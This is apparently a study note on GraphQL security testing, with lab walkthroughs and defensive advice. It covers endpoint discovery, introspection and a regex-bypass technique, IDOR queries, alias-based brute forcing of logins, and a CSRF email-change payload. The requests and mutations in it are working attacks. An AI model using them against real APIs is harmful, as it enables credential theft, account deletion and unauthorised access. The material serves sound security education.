## Definition
GraphQL vulnerabilities generally arise:
- due to implementation and design flaws

For example, the introspection feature may be left active:
- enabling attackers to query the API in order to glean information about its schema.

GraphQL attacks usually take the form of:
- malicious requests that can enable an attacker to 
	- obtain data or perform unauthorized actions. 
	- These attacks can have a severe impact

## Finding GraphQL endpoints
Before you can test a GraphQL API, you first need to:
- find its endpoint

As GraphQL APIs use the same endpoint for all request:
- this is a valuable piece of information

### Universal queries
If you send `query{__typename}` to any GraphQL endpoint:
- it will include the string `{"data": {"__typename": "query"}}` somewhere in its response

This is known as a:
- universal query
- and is a useful tool in probing whether a URL corresponds to a GraphQL service.

The query works because:
- every GraphQL endpoint has a
	- reserved field called `__typename` that 
		- returns the queried object's type as a string.

### Common endpoint names
GraphQL services often use -->  similar endpoint suffixes
=>
When testing for GraphQL endpoints:
- you should look to send universal queries to the following locations:
	- `/graphql`
	- `/api`
	- `/api/graphql`
	- `/graphql/api`
	- `/graphql/graphql`

If these common endpoints don't return a GraphQL response:
- you could also try appending -->  `/v1` to the path

### Request methods
The next step in trying to find GraphQL endpoints is to:
- test using different request methods.

It is best practice for production GraphQL endpoints to:
- only accept POST requests 
	- that have a content-type of `application/json`
		- as this helps to protect against CSRF vulnerabilities

However, some endpoints may:
- accept alternative methods
	- such as GET requests or POST requests 
		- that use a content-type of `x-www-form-urlencoded`.

If you can't find the GraphQL endpoint by sending POST requests to common endpoints:
=>
- try resending the universal query using alternative HTTP methods.

### Initial testing
Once you have discovered the endpoint:
- you can send some test requests 
	- to understand a little more about how it work

If the endpoint is powering a website:
- try exploring the web interface in Burp's browser 
- and use the HTTP history to examine the queries that are sent.

## Exploiting unsanitized arguments
At this point, you can start to look for vulnerabilities. 
Testing query arguments is a good place to start.

If the API uses arguments to access objects directly:
- it may be vulnerable to access control vulnerabilities
- A user could potentially access information:
	- they should not have simply by supplying an argument 
		- that corresponds to that information. 
		  
- This is sometimes known as an -->  Insecure direct object reference (IDOR)

For example, the query below requests a product list for an online shop:
```
#Example product query
    query {
        products {
            id
            name
            listed
        }
    }
```

The product list returned contains only listed products.
```
#Example product response
    {
        "data": {
            "products": [
                {
                    "id": 1,
                    "name": "Product 1",
                    "listed": true
                },
                {
                    "id": 2,
                    "name": "Product 2",
                    "listed": true
                },
                {
                    "id": 4,
                    "name": "Product 4",
                    "listed": true
                }
            ]
        }
    }
```

From this information, we can infer the following:
- Products are assigned a sequential ID.
- Product ID 3 is missing from the list, possibly because it has been delisted.

By querying the ID of the missing product:
- we can get its details,
	- even though it is not listed on the shop 
	- and was not returned by the original product query.

```
#Query to get missing product
    query {
        product(id: 3) {
            id
            name
            listed
        }
    }
```
```
#Missing product response
    {
        "data": {
            "product": {
            "id": 3,
            "name": "Product 3",
            "listed": no
            }
        }
    }
```

## Discovering schema information
The next step in testing the API is to:
- piece together information about the underlying schema.

The best way to do this is to:
- use introspection queries.

Introspection is:
- a built-in GraphQL function 
- that enables you to query a server for information about the schema.

Introspection helps you to:
- understand how you can interact with a GraphQL API
- It can also disclose potentially sensitive data, such as description fields.

### Using introspection
To use introspection to discover schema information:
- query the `__schema` field. 
- This field is available on the root type of all queries.

Like regular queries, you can specify:
- the fields 
- and structure of the response you want to be returned 
	- when running an introspection query

For example, you might want the response to contain only the names of available mutations.

### Probing for introspection
It is best practice for introspection to b:
- disabled in production environments
- but this advice is not always followed.

You can probe for introspection:
- using the following simple query

If introspection is enabled:
- the response returns the names of all available queries
```
#Introspection probe request
    {
        "query": "{__schema{queryType{name}}}"
    }
```

### Running a full introspection query
The next step is to:
- run a full introspection query 
	- against the endpoint 
		- so that you can get as much information on the underlying schema as possible.

The example query below returns full details on all queries, mutations, subscriptions, types, and fragments.
```
#Full introspection query
    query IntrospectionQuery {
        __schema {
            queryType {
                name
            }
            mutationType {
                name
            }
            subscriptionType {
                name
            }
            types {
             ...FullType
            }
            directives {
                name
                description
                args {
                    ...InputValue
            }
            onOperation  #Often needs to be deleted to run query
            onFragment   #Often needs to be deleted to run query
            onField      #Often needs to be deleted to run query
            }
        }
    }

    fragment FullType on __Type {
        kind
        name
        description
        fields(includeDeprecated: true) {
            name
            description
            args {
                ...InputValue
            }
            type {
                ...TypeRef
            }
            isDeprecated
            deprecationReason
        }
        inputFields {
            ...InputValue
        }
        interfaces {
            ...TypeRef
        }
        enumValues(includeDeprecated: true) {
            name
            description
            isDeprecated
            deprecationReason
        }
        possibleTypes {
            ...TypeRef
        }
    }

    fragment InputValue on __InputValue {
        name
        description
        type {
            ...TypeRef
        }
        defaultValue
    }

    fragment TypeRef on __Type {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
                ofType {
                    kind
                    name
                }
            }
        }
    }
```

### Visualizing introspection results
Responses to introspection queries can be full of information:
- but are often very long and hard to process.

You can view relationships between schema entities more easily:
- using a [GraphQL visualizer](http://nathanrandal.com/graphql-visualizer/)
- This is an online tool that:
	- takes the results of an introspection query 
	- and produces a visual representation of the returned data, 
		- including the relationships between operations and types.

### Suggestions
Even if introspection is entirely disabled:
- you can sometimes use suggestions to glean information on an API's structure.

Suggestions are:
- a feature of the Apollo GraphQL platform 
	- in which the server can suggest query amendments in error messages. 
	  
- These are generally used where:
	- a query is slightly incorrect but still recognizable 
	  (for example `There is no entry for 'productInfo'. Did you mean 'productInformation' instead?`).

You can potentially glean useful information from this, as the response is effectively giving away valid parts of the schema.

[Clairvoyance](https://github.com/nikitastupin/clairvoyance) is a tool that:
- uses suggestions to automatically recover all or part of a GraphQL schema
- even when introspection is disabled. 
- This makes it significantly less time consuming to piece together information from suggestion responses.

#### Accessing private GraphQL posts
**Identify the vulnerability**
1. In Burp's browser, access the blog page.
2. In Burp, go to **Proxy > HTTP history** and notice the following:
    - Blog posts are retrieved using a [GraphQL](https://portswigger.net/web-security/graphql) query.
    - In the response to the GraphQL query, each blog post has its own sequential `id`.
    - Blog post `id` 3 is missing from the list. 
    - This indicates that there is a hidden blog post.
      
1. Find the `POST /graphql/v1` request. 
	1. Right-click it and select **Send to Repeater**.
    
4. In Repeater, right-click anywhere in the Request panel of the message editor 
	1. select **GraphQL > Set introspection query** to insert an introspection query into the request body.
    
5. Send the request. 
	1. Notice in the response that the `BlogPost` type has a `postPassword` field available.

**Exploit the vulnerability to find the password**
1. In the HTTP history, find the `POST /graphql/v1` request for one of the post (open one post on the browser) 
	1. Right-click it and select **Send to Repeater**.
    
2. In Repeater, click on the **GraphQL** tab. In the **Variables** panel, modify the `id` variable to 3 (the ID of the hidden blog post).
    
3. In the **Query** panel, add the `postPassword` field to the query.
4. Send the request.
    
5. Copy the contents of the response's `postPassword` field and paste them into the **Submit solution** dialog to solve the lab. You may need to refresh the page

#### Accidental exposure of private GraphQL fields
**Identify the vulnerability**
1. In Burp's browser, access the lab and select **My account**.
2. Attempt to log in to the site.
3. In Burp, go to **Proxy > HTTP history** and notice that the login attempt is sent as a GraphQL mutation containing a username and password.
4. Right-click the login request and select **Send to Repeater**.
5. In Repeater, right-click anywhere within the Request panel of the message editor and select **GraphQL > Set introspection query** to insert an introspection query into the request body.
    
6. Send the request.
7. Right-click the message and select **GraphQL > Save GraphQL queries to site map**.
8. Go to **Target > Site map** and review the GraphQL queries. Notice the following:
    - There is a `getUser` query that returns a user's username and password.
    - This query fetches the relevant user information via a direct reference to an `id` number.

**Modify the query to retrieve the administrator credentials**
1. Right-click the the `getUser` query and select **Send to Repeater**.
2. In Repeater, click **Send**. Notice that the default `id` value of `0` doesn't return a user.
3. Select the GraphQL tab and test alternative values for the `id` variable until the API returns the administrator's credentials. In this case, the administrator's ID is `1`.

4. Log in to the site as the administrator, go to the **Admin** panel, and delete `carlos` to solve the lab.

## Bypassing GraphQL introspection defenses
If you cannot get introspection queries to run for the API you are testing:
- try inserting a special character after the `__schema` keyword.

When developers disable introspection:
- they could use a regex to exclude the `__schema` keyword in queries. 
  =>
- You should try characters like:
- spaces, new lines and commas, 
	- as they are ignored by GraphQL but not by flawed regex.

As such, if the developer has only excluded `__schema{`:
- then the below introspection query would not be excluded.
```
#Introspection query with newline
    {
        "query": "query{__schema
        {queryType{name}}}"
    }
```

If this doesn't work:
- try running the probe over an alternative request method
	- as introspection may only be disabled over POST
	  
- Try a GET request, or a POST request with a content-type of `x-www-form-urlencoded`.

The example below shows an introspection probe sent via GET, 
with URL-encoded parameters.
```
# Introspection probe as GET request
GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D
```

### Finding a hidden GraphQL endpoint
**Find the hidden GraphQL endpoint**
1. In Repeater, send requests to some common GraphQL endpoint suffixes and inspect the results.
    
2. Note that when you send a GET request to `/api` the response contains a "Query not present" error. 
	1. This hints that there may be a GraphQL endpoint responding to GET requests at this location.
    
3. Amend the request to contain a universal query. 
	1. Note that, because the endpoint is responding to GET requests, you need to send the query as a URL parameter.
	2. For example: `/api?query=query{__typename}`.
    
4. Notice that the response confirms that this is a GraphQL endpoint:
```
{
  "data": {
    "__typename": "query"
  }
}
```

**Overcome the introspection defenses**
1. Send a new request with a URL-encoded introspection query as a query parameter
	1. To do this, right-click the request and select **GraphQL > Set introspection query**:
```
/api?query=query+IntrospectionQuery+%7B%0A++__schema+%7B%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A
```

1. Notice from the response that introspection is disallowed.
2. Modify the query to include a newline character after `__schema` and resend.
3. For example:
```
/api?query=query+IntrospectionQuery+%7B%0D%0A++__schema%0a+%7B%0D%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A
```
1. Notice that the response now includes full introspection details. 
2. This is because the server is configured to exclude queries matching the regex `"__schema{"`, which the query no longer matches even though it is still a valid introspection query.


**Exploit the vulnerability to delete carlos**
1. Right-click the request and select **GraphQL > Save GraphQL queries to site map**.
2. Go to **Target > Site map** to see the API queries. 
	1. Use the **GraphQL** tab and find the `getUser` query. Right-click the request and select **Send to Repeater**.
    
3. In Repeater, send the `getUser` query to the endpoint you discovered.
	1. Notice that the response returns:
```
{
"data": {
"getUser": null
}
}
```
1. Click on the GraphQL tab and change the `id` variable to find `carlos`'s user ID. In this case, the relevant user ID is `3`.

2. In **Target > Site map**, browse the schema again and find the `deleteOrganizationUser` mutation.
	1. Notice that this mutation takes a user ID as a parameter.

4. Send the request to Repeater.
4. In Repeater, send a `deleteOrganizationUser` mutation with a user ID of `3` to delete `carlos` and solve the lab.
	1. For example:
```
/api?query=mutation+%7B%0A%09deleteOrganizationUser%28input%3A%7Bid%3A+3%7D%29+%7B%0A%09%09user+%7B%0A%09%09%09id%0A%09%09%7D%0A%09%7D%0A%7D
```


## Bypassing rate limiting using aliases
Ordinarily, GraphQL objects:
- can't contain multiple properties with the same name
=>
Aliases enable you to:
- bypass this restriction 
	- by explicitly naming the properties you want the API to return. 

You can use aliases to:
- return multiple instances of the same type of object in one request.

While aliases are intended to limit the number of API calls you need to make:
- they can also be used to brute force a GraphQL endpoint.

Many endpoints:
- will have some sort of rate limiter in place 
	- to prevent brute force attacks. 
	  
- Some rate limiters:
	- work based on the number of HTTP requests received 
	- rather than the number of operations performed on the endpoint. 
	  
- Because aliases effectively enable you to send multiple queries in a single HTTP message:
	- they can bypass this restriction.

The simplified example below:
- shows a series of aliased queries 
	- checking whether store discount codes are valid. 
	- 
- This operation could potentially:
	- bypass rate limiting as it is a single HTTP request, 
		- even though it could potentially be used to check a vast number of discount codes at once.

```
 #Request with aliased queries
    query isValidDiscount($code: Int) {
        isvalidDiscount(code:$code){
            valid
        }
        isValidDiscount2:isValidDiscount(code:$code){
            valid
        }
        isValidDiscount3:isValidDiscount(code:$code){
            valid
        }
    }
```

### Bypassing GraphQL brute force protections
1. In Burp's browser, access the lab and select **My account**.
2. Attempt to log in to the site using incorrect credentials.
3. In Burp, go to **Proxy > HTTP history**. Note that login requests are sent as a GraphQL mutation.

4. Right-click the login request and select **Send to Repeater**.
5. In Repeater, attempt some further login requests with incorrect credentials. Note that after a short period of time the API starts to return a rate limit error.
    
6. In the GraphQL tab, craft a request that uses aliases to send multiple login mutations in one message. See the tip in this lab for a method that makes this process less time-consuming.
	1. Bear the following in mind when constructing your request:

	- The list of aliases should be contained within a `mutation {}` type.
	- Each aliased mutation should have the username `carlos` and a different password from the authentication list.
	- If you are modifying the request that you sent to Repeater, delete the variable dictionary and `operationName` field from the request before sending. 
		- You can do this from Repeater's **Pretty** tab.
	- Ensure that each alias requests the `success` field, as shown in the simplified example below:
```
mutation login {
        bruteforce0:login(input:{password: "123456", username: "carlos"}) {
              token
              success
          }

          bruteforce1:login(input:{password: "password", username: "carlos"}) {
              token
              success
          }

    ...

          bruteforce99:login(input:{password: "12345678", username: "carlos"}) {
              token
              success
          }
    }
```

1. Click **Send**.
2. Notice that the response lists each login attempt and whether its login attempt was successful.
    
3. Use the search bar below the response to search for the string `true`. 
	1. This indicates which of the aliased mutations was able to successfully log in as `carlos`.
    
4. Check the request for the password that was used by the successful alias.
5. Log in to the site using the `carlos` credentials to solve the lab.

## GraphQL CSRF
Cross-site request forgery (CSRF) vulnerabilities enable an attacker to:
- induce users to perform actions that they do not intend to perform. 
- This is done by:
	- creating a malicious website that forges a cross-domain request to the vulnerable application

GraphQL can be used as a vector for CSRF attacks:
- whereby an attacker creates an exploit that causes 
	- a victim's browser to send a malicious query as the victim user

### How do CSRF over GraphQL vulnerabilities arise?
CSRF vulnerabilities can arise where a GraphQL endpoint:
- does not validate the content type of the requests sent to it 
- and no CSRF tokens are implemented.

POST reqs that use a content type of `application/json` are secure against forgery as long as:
- the content type is validated

In this case, an attacker:
- wouldn't be able to make the victim's browser send this request 
- even if the victim were to visit a malicious site.

However, alternative methods such as GET, or any request that has a content type of `x-www-form-urlencoded`:
- can be sent by a browser 
- and so may leave users vulnerable to attack if the endpoint accepts these requests.
- Where this is the case:
	- attackers may be able to craft exploits to send malicious requests to the API

### Performing CSRF exploits over GraphQL
1. Open Burp's browser, access the lab and log in to your account.
2. Enter a new email address, then click **Update email**.
3. In Burp, go to **Proxy > HTTP history** and check the resulting request. 
	1. Note that the email change is sent as a GraphQL mutation.
    
4. Right-click the email change request and select **Send to Repeater**.
5. In Repeater, amend the GraphQL query to change the email to a second different address.
   
6. Click **Send**.
7. In the response, notice that the email has changed again. 
	1. This indicates that you can reuse a session cookie to send multiple requests.
    
8. Convert the request into a POST request with a `Content-Type` of `x-www-form-urlencoded`
	1. To do this, right-click the request and select **Change request method** twice.
    
9. Notice that the mutation request body has been deleted. 
	1. Add the request body back in with URL encoding.
	2. The body should look like the below:
```
query=%0A++++mutation+changeEmail%28%24input%3A+ChangeEmailInput%21%29+%7B%0A++++++++changeEmail%28input%3A+%24input%29+%7B%0A++++++++++++email%0A++++++++%7D%0A++++%7D%0A&operationName=changeEmail&variables=%7B%22input%22%3A%7B%22email%22%3A%22hacker%40hacker.com%22%7D%7D
```
1. Right-click the request and select **Engagement tools > Generate CSRF PoC**. 
	1. Burp displays the **CSRF PoC generator** dialog.
    
2. Amend the HTML in the **CSRF PoC generator** dialog so that it changes the email a third time. 
	1. This step is necessary because otherwise the exploit won't make any changes to the current email address at the time it is run. 
	2. Likewise, if you test the exploit before delivering, make sure that you change the email from whatever it is currently set to before delivering to the victim.
    
3. Copy the HTML.
4. In the lab, click **Go to exploit server**.
5. Paste the HTML into the exploit server and click **Deliver exploit to victim** to solve the lab.

## Preventing GraphQL attacks
To prevent many common GraphQL attacks, take the following steps when you deploy your API to production:
- If your API is not intended for use by the general public:
	- disable introspection on it. 
	- This makes it harder for an attacker to:
		- gain information about how the API works
		- and reduces the risk of unwanted information disclosure.
    
- If your API is intended for use by the general public:
	- then you will likely need to leave introspection enabled. 
	- However, you should review the API's schema:
		- to make sure that it does not expose unintended fields to the public.
    
- Make sure that suggestions are disabled. 
	- This prevents attackers from
		- being able to use Clairvoyance 
		- or similar tools to glean information about the underlying schema.
    
- Make sure that your API's schema does not expose any private user fields, 
	- such as email addresses or user IDs.
    

### Preventing GraphQL brute force attacks
It is sometimes possible to bypass standard rate limiting when using GraphQL APIs. 

With this in mind, there are design steps that you can take to defend your API against brute force attacks. 
This generally involves:
- restricting the complexity of queries accepted by the API
- and reducing the opportunity for attackers to execute denial-of-service (DoS) attacks.

To defend against brute force attacks:
- Limit the query depth of your API's queries. 
	- The term "query depth" refers to:
		- the number of levels of nesting within a query
		  
	- Heavily-nested queries:
		- can have significant performance implications
		- can potentially provide an opportunity for DoS attacks if they are accepted
		  
	- By limiting the query depth your API accepts:
		- you can reduce the chances of this happening.
    
- Configure operation limits.
	- It enable you to configure the maximum number of unique fields, aliases, and root fields that your API can accept.
    
- Configure the maximum amount of bytes a query can contain.
    
- Consider implementing cost analysis on your API:
	- Cost analysis is a process whereby:
		- a library application identifies the resource cost associated with running queries as they are received
	- If a query would be too computationally complex to run:
		- the API drops it.